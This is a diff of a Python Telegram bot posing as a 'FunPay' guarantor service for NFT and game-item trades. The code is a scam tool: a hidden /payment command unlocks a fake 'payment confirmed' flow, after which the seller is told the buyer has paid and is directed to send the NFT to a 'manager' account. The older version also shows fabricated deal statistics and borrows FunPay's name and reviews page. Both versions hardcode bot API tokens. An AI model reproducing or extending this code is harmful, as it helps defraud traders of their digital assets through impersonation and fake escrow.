@@ -1,376 +1,232 @@
 import asyncio
-import logging
 import os
 import random
 import string
-from typing import Optional
-
+import logging
 from aiogram import Bot, Dispatcher, F, Router
-from aiogram.client.default import DefaultBotProperties
-from aiogram.enums import ParseMode
-from aiogram.filters import Command, CommandObject, CommandStart
+from aiogram.filters import CommandStart, Command, CommandObject
+from aiogram.types import Message, CallbackQuery, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
-from aiogram.exceptions import TelegramConflictError
-from aiogram.types import (
-    CallbackQuery,
-    FSInputFile,
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Message,
-)
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode
 
-API_TOKEN = "8739690833:AAFRCEsPd7FcphwcP56KpHs7dIEfHMrMPoQ"
-SUPPORT_HANDLE = "@FunpayDealsManager"
-SUPPORT_URL = "https://t.me/FunpayDealsManager"
-REVIEWS_URL = "https://otzovik.com/reviews/funpay_ru-birzha_igrovih_cennostey/"
-PHOTO_FILENAME = "funpay.jpg"
+# --- КОНФИГУРАЦИЯ ---
+API_TOKEN = '8658851455:AAFgdTNtPWz-SGQ_HtOkFg9vxtUKkFwfbxM'
+MANAGER = "@FunpayDealsManager"
+NFT_MANAGER = "@FunpayManagerGifts"
+NEWS_URL = "https://t.me/NewsFunpayBot"
+SITE_URL = "https://funpay.com"
+PHOTO_PATH = r"D:\бот заказ №1\funpay.jpg" 
+
+logging.basicConfig(level=logging.INFO)
 
 bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-DEALS: dict[str, dict] = {}
-PAYMENT_ACCESS: set[int] = set()
+# Хранилища данных
+DEALS = {}
+PAYMENT_ACCESS = set() 
+USER_LANGS = {}
 
-cached_photo_id: Optional[str] = None
-cached_bot_username: Optional[str] = None
+class DealCreate(StatesGroup):
+    curr = State()
+    amount = State()
+    item = State()
+    reqs = State()
 
-base_path = os.path.dirname(os.path.abspath(__file__))
-photo_path = os.path.join(base_path, PHOTO_FILENAME)
+# --- ТЕКСТЫ ЛОКАЛИЗАЦИИ ---
+STRINGS = {
+    'ru': {
+        'welcome': "<b>Market FunPay OTC — Ваша безопасность в мире цифровых активов.</b>\n\n"
+                   "Мы предоставляем профессиональный сервис для проведения сделок с игровыми ценностями, "
+                   "NFT и аккаунтами. Наша платформа гарантирует сохранность средств до момента "
+                   "подтверждения выполнения обязательств обеими сторонами.\n\n"
+                   "<b>Выберите необходимое действие ниже:</b>",
+        'btn_create': "📝 Создать сделку",
+        'btn_stats': "🔐 Верификация и статистика",
+        'btn_lang': "🌐 Язык / Language",
+        'btn_news': "📢 Funpay News",
+        'btn_more': "ℹ️ Подробнее",
+        'btn_support': "📞 Поддержка",
+        'step_curr': "Выберите валюту сделки:",
+        'step_amount': "Введите сумму сделки:",
+        'step_item': "Введите название товара (NFT):",
+        'step_reqs': "Укажите ваши реквизиты (карта/USDT/User):",
+        'deal_ready': "✅ <b>Сделка #{id} готова!</b>\n\n📦 Товар: {item}\n💰 Сумма: {amount} {curr}\n\n🔗 <b>Ссылка для покупателя:</b>\n<code>{link}</code>",
+        'pay_btn': "💳 Оплатить товар",
+        'stats_text': "📊 <b>Ваша статистика:</b>\n• Успешных сделок: 0\n• Общий объем: 0.00 ₽\n• Рефералов: 0\n• Баланс: 0.00 ₽\n\n"
+                      "<b>Что дает премиум-статус:</b>\n• Верификация продавца - знак доверия\n• Гарант сделок - защита от мошенников\n"
+                      "• 🎧 Приоритетная поддержка - быстрые ответы\n• Сниженная комиссия - 0.5% вместо 1%\n"
+                      "• Быстрые выплаты - в течение 1 часа\n• Бонусы за рефералов - +10% к балансу\n\n"
+                      "<b>Безопасность:</b>\n• Шифрование всех данных\n• Страхование сделок\n• Юридическая защита\n• 24/7 мониторинг\n\n"
+                      "<b>Преимущества:</b>\n• Повышенное доверие покупателей\n• Больше успешных сделок\n• Персональный менеджер\n• Эксклюзивные предложения",
+        'pay_err': "⚠️ Ошибка: Платежный шлюз временно недоступен.",
+        'pay_ok': "🎉 Оплата подтверждена!",
+        'seller_notify': "🔔 <b>Покупатель оплатил сделку!</b>\n\nДля проведения успешной сделки вам требуется отправить НФТ менеджеру: {manager}"
+    },
+    'en': {
+        'welcome': "<b>Market FunPay OTC — Security Service.</b>\n\nSelect an action:",
+        'btn_create': "📝 Create Deal",
+        'btn_stats': "🔐 Verification & Stats",
+        'btn_lang': "🌐 Language / Язык",
+        'btn_news': "📢 Funpay News",
+        'btn_more': "ℹ️ More Info",
+        'btn_support': "📞 Support",
+        'step_curr': "Select currency:",
+        'step_amount': "Enter amount:",
+        'step_item': "Enter item name:",
+        'step_reqs': "Enter your requisites:",
+        'deal_ready': "✅ <b>Deal #{id} is ready!</b>\n\n📦 Item: {item}\n💰 Price: {amount} {curr}\n\n🔗 <b>Link:</b>\n<code>{link}</code>",
+        'pay_btn': "💳 Pay for item",
+        'stats_text': "📊 <b>Stats:</b>\n• Successful deals: 0\n\n<b>Premium:</b>\n• Verified badge\n• Escrow protection\n• Priority support",
+        'pay_err': "⚠️ Error: Payment gateway is offline.",
+        'pay_ok': "🎉 Payment confirmed!",
+        'seller_notify': "🔔 <b>The buyer has paid for the deal!</b>\n\nTo complete the transaction, you need to send the NFT to the manager: {manager}"
+    }
+}
 
+# --- КЛАВИАТУРЫ ---
+def get_main_kb(uid):
+    lang = USER_LANGS.get(uid, 'ru')
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=STRINGS[lang]['btn_create'], callback_data="make_deal")],
+        [InlineKeyboardButton(text=STRINGS[lang]['btn_stats'], callback_data="v_stats")],
+        [InlineKeyboardButton(text=STRINGS[lang]['btn_lang'], callback_data="lang_menu")],
+        [InlineKeyboardButton(text=STRINGS[lang]['btn_news'], url=NEWS_URL)],
+        [InlineKeyboardButton(text=STRINGS[lang]['btn_more'], url=SITE_URL)],
+        [InlineKeyboardButton(text=STRINGS[lang]['btn_support'], url=f"https://t.me/{MANAGER[1:]}")]
+    ])
 
-class DealCreation(StatesGroup):
-    choosing_currency = State()
-    entering_amount = State()
-    entering_item = State()
-    entering_requisites = State()
+# --- ЛОГИКА ОПЛАТЫ ---
+@router.callback_query(F.data.startswith("pay_"))
+async def handle_pay(c: CallbackQuery):
+    d_id = c.data.split("_")[1]
+    deal = DEALS.get(d_id)
+    if not deal: return
+    lang = USER_LANGS.get(c.from_user.id, 'ru')
 
-
-def get_main_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
-            [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals")],
-            [InlineKeyboardButton(text="📊 Статистика", callback_data="stats")],
-            [InlineKeyboardButton(text="🔐 Верификация", callback_data="verify")],
-            [InlineKeyboardButton(text="ℹ️ Подробнее", callback_data="about")],
-            [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)],
-        ]
-    )
-
-
-def get_main_menu_text() -> str:
-    return (
-        "<b>Добро пожаловать в Funpay Gifts</b>\n\n"
-        "<blockquote>"
-        "🛡️ Защита от мошенников\n"
-        "💰 Автоматическое удержание средств\n"
-        "📝 Прозрачная статистика\n"
-        "🎯 Поддержка 24/7\n"
-        "📊 История сделок"
-        "</blockquote>"
-    )
-
-
-def get_currency_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(text="💳 RUB", callback_data="curr_rub"),
-                InlineKeyboardButton(text="💵 USD", callback_data="curr_usd"),
-            ],
-            [InlineKeyboardButton(text="⭐️ Stars", callback_data="curr_stars")],
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")],
-        ]
-    )
-
-
-def get_back_keyboard() -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(
-        inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]]
-    )
-
-
-def get_deal_keyboard(deal_id: str) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(text="💸 Оплатить сделку", callback_data=f"pay_{deal_id}")],
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")],
-        ]
-    )
-
-
-async def _send_text_only(
-    event: Message | CallbackQuery,
-    text: str,
-    reply_markup: InlineKeyboardMarkup,
-):
-    if isinstance(event, CallbackQuery) and event.message:
+    # Проверка на секретную команду /payment
+    if c.from_user.id not in PAYMENT_ACCESS:
+        await c.answer(STRINGS[lang]['pay_err'], show_alert=True)
+    else:
+        # Уведомляем создателя сделки (продавца)
+        seller_msg = STRINGS[lang]['seller_notify'].format(manager=NFT_MANAGER)
         try:
-            await event.message.edit_text(text, reply_markup=reply_markup)
+            await bot.send_message(deal['owner_id'], seller_msg)
+        except: pass
+        
+        # Ответ покупателю
+        await c.message.answer(STRINGS[lang]['pay_ok'])
+        await c.answer()
+
+# --- СОЗДАНИЕ СДЕЛКИ ---
+@router.callback_query(F.data == "make_deal")
+async def start_create(c: CallbackQuery, state: FSMContext):
+    lang = USER_LANGS.get(c.from_user.id, 'ru')
+    await state.set_state(DealCreate.curr)
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="💳 RUB", callback_data="c_RUB"), 
+         InlineKeyboardButton(text="💵 USD", callback_data="c_USD"),
+         InlineKeyboardButton(text="⭐️ Stars", callback_data="c_STARS")]
+    ])
+    await c.message.answer(STRINGS[lang]['step_curr'], reply_markup=kb)
+    await c.answer()
+
+@router.callback_query(F.data.startswith("c_"))
+async def set_cur(c: CallbackQuery, state: FSMContext):
+    await state.update_data(curr=c.data.split("_")[1])
+    await state.set_state(DealCreate.amount)
+    lang = USER_LANGS.get(c.from_user.id, 'ru')
+    await c.message.answer(STRINGS[lang]['step_amount'])
+    await c.answer()
+
+@router.message(DealCreate.amount)
+async def set_amt(m: Message, state: FSMContext):
+    await state.update_data(amount=m.text)
+    await state.set_state(DealCreate.item)
+    lang = USER_LANGS.get(m.from_user.id, 'ru')
+    await m.answer(STRINGS[lang]['step_item'])
+
+@router.message(DealCreate.item)
+async def set_itm(m: Message, state: FSMContext):
+    await state.update_data(item=m.text)
+    await state.set_state(DealCreate.reqs)
+    lang = USER_LANGS.get(m.from_user.id, 'ru')
+    await m.answer(STRINGS[lang]['step_reqs'])
+
+@router.message(DealCreate.reqs)
+async def finish(m: Message, state: FSMContext):
+    data = await state.get_data()
+    d_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    DEALS[d_id] = {"owner_id": m.from_user.id, **data}
+    
+    bot_me = await bot.get_me()
+    link = f"https://t.me/{bot_me.username}?start=deal_{d_id}"
+    lang = USER_LANGS.get(m.from_user.id, 'ru')
+    
+    await m.answer(STRINGS[lang]['deal_ready'].format(id=d_id, item=data['item'], amount=data['amount'], curr=data['curr'], link=link), reply_markup=get_main_kb(m.from_user.id))
+    await state.clear()
+
+# --- СИСТЕМНОЕ ---
+@router.message(CommandStart())
+async def start(m: Message, state: FSMContext, command: CommandObject = None):
+    await state.clear()
+    uid = m.from_user.id
+    if uid not in USER_LANGS: USER_LANGS[uid] = 'ru'
+    lang = USER_LANGS[uid]
+
+    if command and command.args and command.args.startswith("deal_"):
+        d_id = command.args.split("_")[1]
+        if d_id in DEALS:
+            d = DEALS[d_id]
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text=STRINGS[lang]['pay_btn'], callback_data=f"pay_{d_id}")],
+                [InlineKeyboardButton(text="🏠 Menu", callback_data="home")]
+            ])
+            await m.answer(f"🛡 <b>Сделка #{d_id}</b>\n\nТовар: {d['item']}\nСумма: {d['amount']} {d['curr']}", reply_markup=kb)
             return
-        except Exception:
-            try:
-                await event.message.delete()
-            except Exception:
-                pass
-            await event.message.answer(text, reply_markup=reply_markup)
-        return
 
-    target = event.message if isinstance(event, CallbackQuery) else event
-    if target:
-        await target.answer(text, reply_markup=reply_markup)
+    if os.path.exists(PHOTO_PATH):
+        await m.answer_photo(photo=FSInputFile(PHOTO_PATH), caption=STRINGS[lang]['welcome'], reply_markup=get_main_kb(uid))
+    else:
+        await m.answer(STRINGS[lang]['welcome'], reply_markup=get_main_kb(uid))
 
+@router.callback_query(F.data == "v_stats")
+async def v_stats(c: CallbackQuery):
+    lang = USER_LANGS.get(c.from_user.id, 'ru')
+    await c.message.answer(STRINGS[lang]['stats_text'], reply_markup=get_main_kb(c.from_user.id))
+    await c.answer()
 
-async def universal_send(
-    event: Message | CallbackQuery,
-    text: str,
-    reply_markup: InlineKeyboardMarkup,
-    use_photo: bool = True,
-):
-    global cached_photo_id
+@router.callback_query(F.data == "lang_menu")
+async def lang_menu(c: CallbackQuery):
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🇷🇺 RU", callback_data="sl_ru"), InlineKeyboardButton(text="🇺🇸 EN", callback_data="sl_en")]
+    ])
+    await c.message.answer("Select Language:", reply_markup=kb)
+    await c.answer()
 
-    if not use_photo:
-        await _send_text_only(event, text, reply_markup)
-        return
+@router.callback_query(F.data.startswith("sl_"))
+async def set_l(c: CallbackQuery):
+    USER_LANGS[c.from_user.id] = c.data.split("_")[1]
+    await start(c.message, None)
+    await c.answer()
 
-    if isinstance(event, CallbackQuery) and event.message:
-        try:
-            await event.message.edit_caption(caption=text, reply_markup=reply_markup)
-            return
-        except Exception:
-            pass
-
-    target = event.message if isinstance(event, CallbackQuery) else event
-    if target is None:
-        return
-
-    try:
-        if cached_photo_id:
-            await target.answer_photo(photo=cached_photo_id, caption=text, reply_markup=reply_markup)
-            return
-
-        if os.path.exists(photo_path):
-            sent = await target.answer_photo(
-                photo=FSInputFile(photo_path),
-                caption=text,
-                reply_markup=reply_markup,
-            )
-            if sent.photo:
-                cached_photo_id = sent.photo[-1].file_id
-            return
-
-        await target.answer(text, reply_markup=reply_markup)
-    except Exception as err:
-        logging.exception("Ошибка отправки фото: %s", err)
-        await target.answer(text, reply_markup=reply_markup)
-
+@router.callback_query(F.data == "home")
+async def h(c: CallbackQuery):
+    await start(c.message, None)
+    await c.answer()
 
 @router.message(Command("payment"))
-async def secret_payment_command(message: Message):
-    PAYMENT_ACCESS.add(message.from_user.id)
-    await message.answer("🤫 Доступ к оплате активирован. Теперь можно оплачивать сделки.")
-
-
-@router.message(CommandStart())
-async def start_cmd(message: Message, command: CommandObject, state: FSMContext):
-    await state.clear()
-
-    if command.args and command.args.startswith("deal_"):
-        deal_id = command.args.split("_", maxsplit=1)[1]
-        deal = DEALS.get(deal_id)
-        if deal:
-            text = (
-                f"💳 <b>Сделка #{deal_id}</b>\n\n"
-                f"👤 Продавец: @{deal['creator_username']}\n"
-                f"📦 Товар: {deal['item']}\n\n"
-                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-                f"🏦 Реквизиты: <code>{deal['requisites']}</code>"
-            )
-            await universal_send(message, text, get_deal_keyboard(deal_id), use_photo=False)
-            return
-
-    text = get_main_menu_text()
-    await universal_send(message, text, get_main_keyboard(), use_photo=True)
-
-
-@router.callback_query(F.data == "create_deal")
-async def process_create_deal(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    await state.set_state(DealCreation.choosing_currency)
-    await universal_send(callback, "💼 <b>Шаг 1:</b> Выберите валюту сделки:", get_currency_keyboard(), use_photo=False)
-
-
-@router.callback_query(DealCreation.choosing_currency, F.data.startswith("curr_"))
-async def process_currency(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    currency = callback.data.split("_", maxsplit=1)[1].upper()
-    await state.update_data(currency=currency)
-    await state.set_state(DealCreation.entering_amount)
-    await universal_send(
-        callback,
-        f"✅ Валюта: {currency}\n💰 <b>Шаг 2:</b> Введите сумму сделки:",
-        get_back_keyboard(),
-        use_photo=False,
-    )
-
-
-@router.message(DealCreation.entering_amount)
-async def process_amount(message: Message, state: FSMContext):
-    if not message.text:
-        await message.answer("❌ Введите сумму текстом, например: 1500")
-        return
-
-    await state.update_data(amount=message.text)
-    await state.set_state(DealCreation.entering_item)
-    await universal_send(message, "📝 <b>Шаг 3:</b> Введите название товара:", get_back_keyboard(), use_photo=False)
-
-
-@router.message(DealCreation.entering_item)
-async def process_item(message: Message, state: FSMContext):
-    if not message.text:
-        await message.answer("❌ Введите название товара текстом")
-        return
-
-    await state.update_data(item=message.text)
-    await state.set_state(DealCreation.entering_requisites)
-    await universal_send(message, "💳 <b>Шаг 4:</b> Укажите реквизиты для выплаты:", get_back_keyboard(), use_photo=False)
-
-
-@router.message(DealCreation.entering_requisites)
-async def process_requisites(message: Message, state: FSMContext):
-    global cached_bot_username
-
-    if not message.text:
-        await message.answer("❌ Укажите реквизиты текстом")
-        return
-
-    data = await state.get_data()
-    if not all(k in data for k in ("currency", "amount", "item")):
-        await state.clear()
-        await message.answer("⚠️ Сессия создания сделки сброшена. Нажмите «Создать сделку» ещё раз.")
-        return
-
-    deal_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
-
-    if not cached_bot_username:
-        me = await bot.get_me()
-        cached_bot_username = me.username
-
-    link = f"https://t.me/{cached_bot_username}?start=deal_{deal_id}"
-
-    DEALS[deal_id] = {
-        "creator_id": message.from_user.id,
-        "creator_username": message.from_user.username or "User",
-        "currency": data["currency"],
-        "amount": data["amount"],
-        "item": data["item"],
-        "requisites": message.text,
-    }
-
-    await state.clear()
-    text = (
-        "✅ <b>Сделка создана!</b>\n\n"
-        f"💰 Сумма: {data['amount']} {data['currency']}\n"
-        f"📦 Товар: {data['item']}\n\n"
-        "🔗 <b>Ссылка для покупателя:</b>\n"
-        f"{link}"
-    )
-    await universal_send(message, text, get_back_keyboard(), use_photo=False)
-
-
-@router.callback_query(F.data == "my_deals")
-async def my_deals(callback: CallbackQuery):
-    await callback.answer()
-    print("у вас 0 успешных сделок")
-    await universal_send(callback, "📋 У вас 0 активных и 0 успешных сделок.", get_back_keyboard(), use_photo=False)
-
-
-@router.callback_query(F.data == "verify")
-async def verify(callback: CallbackQuery):
-    await callback.answer("Верификация временно в разработке", show_alert=True)
-
-
-@router.callback_query(F.data == "about")
-async def about(callback: CallbackQuery):
-    await callback.answer()
-    text = (
-        "ℹ️ <b>Market — гарант-сервис</b>\n\n"
-        f"Менеджер и поддержка: {SUPPORT_HANDLE}\n"
-        f"Отзывы: {REVIEWS_URL}\n\n"
-        "Успешных сделок: 0"
-    )
-    markup = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(text="🔗 Отзывы", url=REVIEWS_URL)],
-            [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)],
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")],
-        ]
-    )
-    await universal_send(callback, text, markup, use_photo=False)
-
-
-@router.callback_query(F.data == "stats")
-async def stats(callback: CallbackQuery):
-    await callback.answer()
-    text = (
-        "Статистика Funpay Gifts\n\n"
-        "🤝 Всего сделок: 100713\n"
-        "✅ Успешных сделок: 97635\n"
-        "💰 Общий объем: $1039079\n"
-        "⭐️ Средний рейтинг: 4.9/5.0\n"
-        "🟢 Онлайн сейчас: 19042\n\n"
-        "📈 Наши преимущества:\n"
-        "• 🔒 Гарант-сервис на все сделки\n"
-        "• ⚡️ Мгновенная доставка товаров\n"
-        "• 🛡️ Защита от мошенников\n"
-        "• 💎 Проверенные продавцы\n"
-        "• 📞 24/7 Поддержка\n"
-        "• ⭐️ 99.8% положительных отзывов"
-    )
-    await universal_send(callback, text, get_back_keyboard(), use_photo=False)
-
-
-@router.callback_query(F.data.startswith("pay_"))
-async def pay_deal(callback: CallbackQuery):
-    await callback.answer()
-    deal_id = callback.data.split("_", maxsplit=1)[1]
-
-    if callback.from_user.id not in PAYMENT_ACCESS:
-        await callback.message.answer("❌ Для оплаты сначала введите команду /payment")
-        return
-
-    if deal_id not in DEALS:
-        await callback.message.answer("❌ Сделка не найдена или уже закрыта.")
-        return
-
-    await callback.message.answer("✅ Оплата сделки отмечена. Менеджер проверит перевод.")
-
-
-@router.callback_query(F.data == "back_to_main")
-async def back_to_main(callback: CallbackQuery, state: FSMContext):
-    await callback.answer()
-    await state.clear()
-    await universal_send(callback, get_main_menu_text(), get_main_keyboard(), use_photo=True)
-
+async def pay_cmd(m: Message):
+    PAYMENT_ACCESS.add(m.from_user.id)
+    await m.answer("✅ <b>Платежный доступ активирован.</b>")
 
 async def main():
-    logging.basicConfig(level=logging.INFO)
     await bot.delete_webhook(drop_pending_updates=True)
-    while True:
-        try:
-            await dp.start_polling(bot, drop_pending_updates=True)
-            break
-        except TelegramConflictError:
-            logging.error(
-                "TelegramConflictError: запущен ещё один экземпляр бота с этим токеном. "
-                "Остановите другой процесс/бота в BotFather и перезапустите текущий."
-            )
-            await asyncio.sleep(5)
-            await bot.delete_webhook(drop_pending_updates=True)
+    await dp.start_polling(bot)
 
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     asyncio.run(main())
